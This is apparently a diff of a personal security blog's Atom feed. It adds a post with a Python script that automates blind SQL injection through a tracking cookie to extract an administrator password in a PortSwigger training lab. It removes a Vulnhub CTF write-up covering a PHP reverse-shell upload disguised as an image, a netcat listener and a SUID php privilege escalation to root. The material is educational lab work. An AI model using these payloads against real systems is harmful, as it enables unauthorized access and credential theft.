@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
   <link href="https://darrynbrownfield.co.uk/author/darryn/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
-  <updated>2021-01-02T13:02:01+00:00</updated>
+  <updated>2021-01-02T13:41:50+00:00</updated>
   <id>https://darrynbrownfield.co.uk/author/darryn/feed.xml</id>
 
   
@@ -30,6 +30,95 @@
   
   
 
+  
+    <entry>
+      <title type="html">Blind SQL injection with conditional responses script</title>
+      <link href="https://darrynbrownfield.co.uk/blindsqli" rel="alternate" type="text/html" title="Blind SQL injection with conditional responses script" />
+      <published>2021-01-02T00:00:00+00:00</published>
+      <updated>2021-01-02T00:00:00+00:00</updated>
+      <id>https://darrynbrownfield.co.uk/blindsqli</id>
+      <content type="html" xml:base="https://darrynbrownfield.co.uk/blindsqli">&lt;p&gt;&lt;img src=&quot;/assets/images/websecacademy/blindsql/cover.jpeg&quot; alt=&quot;blindsql&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;This post is to provide the script I created to automate the process of using blind SQL injection with conditional responses to brute force a password. This was completed for a lab while completing the SQL Injection topic on &lt;a href=&quot;https://portswigger.net/web-security&quot;&gt;WebSecurity Academy&lt;/a&gt;. I can’t recommend this training enough, the content is well written and the labs are great and best of all its free!&lt;/p&gt;
+
+&lt;p&gt;As part of the lab I completed process in 3 ways, manually using Burp repeater, using Burp intruder and finally by writing this Python script. I still learning Python and this was a good exercise to do more Python coding and also reenforce the learning.&lt;/p&gt;
+
+&lt;h3 id=&quot;final-script&quot;&gt;Final Script&lt;/h3&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 02/01/21&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# blind-sql-lab.py&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# POC script to automate getting the administrator password using blind sql conditional responses&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Insert URL here!&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;cookievalue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'TrackingId'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookievalue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_lowercase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;cookievalue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;x'+UNION SELECT+'a' FROM users WHERE username='administrator' AND substring(password,{},1)='{}'--&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'TrackingId'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookievalue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Welcome back!&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;
+            
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Password is: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;next-steps&quot;&gt;Next Steps&lt;/h3&gt;
+
+&lt;p&gt;The script could be a lot better, for example:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Initial check to test the website is up&lt;/li&gt;
+  &lt;li&gt;Run a test conditional check to test for SQL injection&lt;/li&gt;
+  &lt;li&gt;Automate the process of finding the password length and pass to the range function&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Darryn</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="websecurityacademy" />
+      
+        <category term="sqli" />
+      
+        <category term="python" />
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
   
     <entry>
       <title type="html">Brooklyn Nine Nine Write Up</title>
@@ -3870,294 +3959,6 @@ root.txt
 
       
         <category term="tryhackme" />
-      
-        <category term="ctf" />
-      
-        <category term="oscp" />
-      
-
-      
-        <summary type="html"></summary>
-      
-
-      
-      
-    </entry>
-  
-    <entry>
-      <title type="html">Photographer Write Up</title>
-      <link href="https://darrynbrownfield.co.uk/photographer" rel="alternate" type="text/html" title="Photographer Write Up" />
-      <published>2020-09-05T00:00:00+00:00</published>
-      <updated>2020-09-05T00:00:00+00:00</updated>
-      <id>https://darrynbrownfield.co.uk/photographer</id>
-      <content type="html" xml:base="https://darrynbrownfield.co.uk/photographer">&lt;p&gt;&lt;img src=&quot;/assets/images/photographer.png&quot; alt=&quot;Photographer&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;Photographer was the last machine I did before I took my OSCP exam so it seemed fitting for it to be the first write up on my new blog. Photographer was a great OSCP like machine created by &lt;a href=&quot;https://twitter.com/v1n1v131r4&quot;&gt;v1n1v131r4&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
-&lt;p&gt;Starting with a Nmap scan lets see what ports are open. I got the IP of the machine by checking the DHCP server on my network. However, I could have used arp-scan to find the IP address.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
-└──╼ $nmap -sC -sV -oA nmap/initial 192.168.1.77
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 17:54 BST
-Nmap scan report for 192.168.1.77
-Host is up (0.0012s latency).
-Not shown: 996 closed ports
-PORT     STATE SERVICE     VERSION
-80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Photographer by v1n1v131r4
-139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
-8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
-|_http-generator: Koken 0.22.24
-|_http-open-proxy: Proxy might be redirecting requests
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: daisa ahomi
-|_http-trane-info: Problem with XML parsing of /evox/about
-Service Info: Host: PHOTOGRAPHER
-
-Host script results:
-|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
-|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
-| smb-os-discovery: 
-|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
-|   Computer name: photographer
-|   NetBIOS computer name: PHOTOGRAPHER\x00
-|   Domain name: \x00
-|   FQDN: photographer
-|_  System time: 2020-09-01T12:54:28-04:00
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-| smb2-security-mode: 
-|   2.02: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2020-09-01T16:54:28
-|_  start_date: N/A
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The scan reveals 4 ports open, Samba and two web. Based on the HTTP banners it looks to be a Linux Ubuntu machine, Googling apache 2.4.18 ubuntu reveals the OS is probably Ubuntu Xenial 16.04 LTS.&lt;/p&gt;
-
-&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
-
-&lt;p&gt;I started with port 80 but didn’t find anything interesting. I ran Gobuster and Nikto and both came up blank so decided to move on for now. On port 8000 I’m presented with a CMS type page. Looking at the footer indicates ‘Built with Koken’.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/Port-8000.png&quot; alt=&quot;Port 8000&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;A quick Google shows &lt;a href=&quot;http://koken.me/&quot;&gt;Koken&lt;/a&gt; is a CMS for photographers. An &lt;a href=&quot;https://www.exploit-db.com/exploits/48706&quot;&gt;exploit&lt;/a&gt; is also available by the same author of the machine which would indicate this is the intend path. However, the exploit requires authentication.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/exploit.png&quot; alt=&quot;Exploit&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Looking at the exploit, the POST request makes a call to &lt;strong&gt;/admin/&lt;/strong&gt;. Going to the URL does provide a login page requiring a email address and password. I will take a look at Samba before going any further on the web ports.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/login.png&quot; alt=&quot;Login&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Using smbclient and logging in anonymously shows one share in particular that looks interesting ‘sambashare’.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
-└──╼ $smbclient -L \\\\192.168.1.77\\
-
-        Sharename       Type      Comment
-        ---------       ----      -------
-        print$          Disk      Printer Drivers
-        sambashare      Disk      Samba on Ubuntu
-        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
-SMB1 disabled -- no workgroup available
-┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
-└──╼ $smbclient \\\\192.168.1.77\\sambashare\\
-Enter WORKGROUP\daz\'s password: 
-Try &quot;help&quot; to get a list of possible commands.
-smb: \&amp;gt; ls
-  .                                   D        0  Tue Jul 21 02:30:07 2020
-  ..                                  D        0  Tue Jul 21 10:44:25 2020
-  mailsent.txt                        N      503  Tue Jul 21 02:29:40 2020
-  wordpress.bkp.zip                   N 13930308  Tue Jul 21 02:22:23 2020
-
-                278627392 blocks of size 1024. 264268400 blocks available
-smb: \&amp;gt; mget *
-Get file mailsent.txt? y
-getting file \mailsent.txt of size 503 as mailsent.txt (245.6 KiloBytes/sec) (average 245.6 KiloBytes/sec)
-Get file wordpress.bkp.zip? y
-getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (67013.8 KiloBytes/sec) (average 66362.5 KiloBytes/sec)
-smb: \&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Two files are on the share, the first is an email from Agi to Daisa advising the site is ready and the other file appears to be a backup zip of the site.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
-└──╼ $cat mailsent.txt 
-Message-ID: &amp;lt;4129F3CA.2020509@dc.edu&amp;gt;
-Date: Mon, 20 Jul 2020 11:40:36 -0400
-From: Agi Clarence &amp;lt;agi@photographer.com&amp;gt;
-User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
-X-Accept-Language: en-us, en
-MIME-Version: 1.0
-To: Daisa Ahomi &amp;lt;daisa@photographer.com&amp;gt;
-Subject: To Do - Daisa Website\'s
-Content-Type: text/plain; charset=us-ascii; format=flowed
-Content-Transfer-Encoding: 7bit
-
-Hi Daisa!
-Your site is ready now.
-Don\'t forget your secret, my babygirl ;)
-┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
-└──╼ $
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;‘babygirl’ looks to be a hint to the password and I now have 2 users and email addresses:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Agi Clarence - agi@photographer.com&lt;/li&gt;
-  &lt;li&gt;Daisa Ahomi - daisa@photographer.com&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;foot-hold&quot;&gt;Foot hold&lt;/h3&gt;
-
-&lt;p&gt;I go back to port &lt;strong&gt;8000/admin/&lt;/strong&gt; and try them out. I get straight in with &lt;strong&gt;daisa@photographer.com&lt;/strong&gt; and &lt;strong&gt;babygirl&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/cms.png&quot; alt=&quot;CMS&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Going back to the exploit from earlier, it looks like I can upload a PHP file by saving the file as .jpg then use Burp to rename it. Im going to try and upload a reverse shell PHP script. If your using Kali or ParrotOS the script can be found in /usr/share/webshells/php/ or downloaded from &lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;pentestmonkey&lt;/a&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
-└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
-┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
-└──╼ $mv php-reverse-shell.php shell.php.jpg
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I update the script with my local IP and port details.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Start a netcat listener ready to catch the shell.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
-└──╼ $sudo nc -nvlp 443
-listening on [any] 443 ...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Going back to the admin page I upload the file using ‘Import content’ and find the PHP file. With Burp open and proxy intercept on I set Burp as a proxy in my browser and select ‘Import’.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/content.png&quot; alt=&quot;Content&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;In Burp I can now remove the .jpg extension from the file and forward the request.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/burp.png&quot; alt=&quot;Burp&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;With the file selected, right clicking on ‘Download File’ and ‘Open Link in New Tab’ should run out PHP script.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/downloadfile.png&quot; alt=&quot;DownloadFile&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I have a shell as www-data! First thing I always do is upgrade it to a more stable TTY using Python.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/shell.png&quot; alt=&quot;Shell&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The first flag can be found in Daisa’s user directory.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@photographer:/$ cd home/daisa/
-www-data@photographer:/home/daisa$ ls
-Desktop    Downloads  Pictures  Templates  examples.desktop
-Documents  Music      Public    Videos     user.txt
-www-data@photographer:/home/daisa$ cat user.txt 
-d41d8cd98f00{REDACTED}
-www-data@photographer:/home/daisa$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h3&gt;
-
-&lt;p&gt;I now need to escalate out of www-data to either a user or root. Im going to use &lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite&quot;&gt;linpeas&lt;/a&gt; to enumerate the machine for possible local privilege escalation paths. First I will use Python to copy the script from my machine.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/linpeas.png&quot; alt=&quot;linpeas&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Linpeas provides a lot of output, looking through the output &lt;strong&gt;/usr/bin/php7.2&lt;/strong&gt; jumps out.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Linpeas will colour code the output based on severity but notice /usr/bin/php7.2 is green. Its important to review all the output and not rely on the scripts/tools to identify potential attack vectors.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/suid.png&quot; alt=&quot;suid&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;First I will check &lt;a href=&quot;https://gtfobins.github.io&quot;&gt;GTFOBins&lt;/a&gt;, searching PHP.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/phpsuid.png&quot; alt=&quot;gtfobins&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Lets give it a go.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@photographer:/tmp$ CMD=&quot;/bin/sh&quot;
-www-data@photographer:/tmp$ /usr/bin/php7.2 -r &quot;pcntl_exec('/bin/sh', ['-p']);&quot;
-# id
-uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
-# whoami
-root
-#
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We have root! Lets grab the flag.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;# 
-# cd /root
-# cat proof.txt
-                                                                
-                                .:/://::::///:-`                
-                            -/++:+`:--:o:  oo.-/+/:`            
-                         -++-.`o++s-y:/s: `sh:hy`:-/+:`         
-                       :o:``oyo/o`. `      ```/-so:+--+/`       
-                     -o:-`yh//.                 `./ys/-.o/      
-                    ++.-ys/:/y-                  /s-:/+/:/o`    
-                   o/ :yo-:hNN                   .MNs./+o--s`   
-                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s   
-                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/  
-                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h  
-                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s. 
-                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +- 
-                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o. 
-                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h` 
-                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o  
-                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`  
-                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-   
-                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.    
-                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`     
-                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-       
-                        ./+:`:yh:dso/.+-++++ss+h++.:++-         
-                           -/+/-:-/y+/d:yh-o:+--/+/:`           
-                              `-///////////////:`               
-                                                                
-
-Follow me at: http://v1n1v131r4.com
-
-
-d41d8cd98f00{REDACTED}
-#
-&lt;/code&gt;&lt;/pre&gt;</content>
-
-      
-      
-      
-      
-      
-
-      <author>
-          <name>Darryn</name>
-        
-        
-      </author>
-
-      
-
-      
-        <category term="vulnhub" />
       
         <category term="ctf" />
       
